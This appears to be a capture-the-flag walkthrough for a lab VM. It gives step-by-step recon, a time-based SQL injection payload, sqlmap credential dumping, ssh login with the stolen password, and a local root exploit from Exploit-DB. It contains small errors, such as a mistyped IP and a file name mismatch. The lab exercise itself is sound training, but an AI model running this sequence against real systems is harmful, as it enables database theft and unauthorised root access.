@@ -1,0 +1,80 @@
+The challenge is to attack the Lord of the Ring machine.
+
+Steps.
+1. Create a new folder on your kali linux desktop where all files that relate to this ctf challenge would be saved. Open the host so the it is live.
+
+2. On your kali linux, switch to the root user.
+
+3. Open a new tab on your linux and type ifconfig to get the the IP address of your linux. The IP is 192.168.255.129
+
+4. Now to discover the IP addresses of any live host on your IP address range type:
+        netdiscover -r 192.168.255.128/24
+
+5. Test the resultants IP addresses to see the one that belong to the Lord of the Ring host.
+    a. copy the addresses and place them on your browser.
+    b. Test ssh connection against the IP addresses. The result shows the IP addressof the host as 192.168.255.128
+
+6.Now carry out an nmap search on the host IP address:
+        nmap -sV -A 192.186.255.128
+        This result shows only port 22 is open, which is for ssh.
+
+7. Now carry out a port knocking:
+        nmap -r -Pn -p1,2,3 192.168.255.128
+
+8. Now check if a port is open:
+        nmap -p- -Pn 192.168.255.128
+        The result shows port 1337 is open
+
+9. Now go to your browser and type 192.168.255.128:1337, then view the page source to see if there is anything there
+
+10. If there is none, add index.php:
+        192.168.255.128:1337/index.php
+        When this was done, an image was seen, on viewing the page source, a base64 code was discovered.
+
+11. Now copy the base64 code, open a new tab and go to the base64 site. Place the code you copied and click on decode until to get a the true value. The value gotten was /978345210/index.php
+
+12. Go back to the intial url and type: http://192.168.255.128:1337/978345210/index.php
+A login form was seen.
+
+13. On trying to bypass the login form with 'OR SLEEP(5) #, it was discovered that it is Vulnerable to SQL injection attack
+
+14. Try to login to the form with any username and password, now go to Burp Suite and intercept the request. Right click on the request in Burp Suite and click on cope to file, then go to the CTF folder you created at the beginning and save the file as ctf1.txt
+
+15. Now go bck to your linux, switch to root user and cd into the CTF folder 
+
+16. You can now discover the dbs by typing this:
+        sqlmap -r ctf1.txt --dbs
+
+17. To get the tables inside the dbs type:
+        sqlmap -r ctf1.txt -D Webapp --tables
+        The Users table was discovered
+
+18. Now to view the table type:
+        sqlmap -r ctf1.txt -D Webapp -T Users --columns -dump
+        This gives the content of all the rolls and columns in the table
+
+19. Now switch back to a normal user and ssh into the host IP address
+        ssh smeagol@192.168.255.128
+        Now, since we already have the password from the Users table, we type it and click enter (MyPreciousR00t)
+        This result now shows we are now connected to the system.
+
+20. We can check who we are by typing:
+        uname -a 
+        However we are not root and need to be root. 
+
+21. To become a root user, type uname -a and you will get the linux version and check the vulnerabilities. For this host it is Ubuntu. 
+
+22. switch to the root user on linux and do a search on Ubuntu by typing:
+        searchsploit Ubuntu 14
+        The result shows the closest vulnerability to the Ubuntu host is number 39166
+
+23. Now go to the exploit db website and look for exploit 39166.
+Type this in the browser https://www.exploit.db.com/exploits/39166 
+Download the exploit and rename it 39166.c 
+
+24. On the smeagol machine type gcc 31966.c -o privesc
+
+25. Now type ./privesc, and now you are now a root user
+
+26. Now type cd /root, and then ls 
+There you find the flag
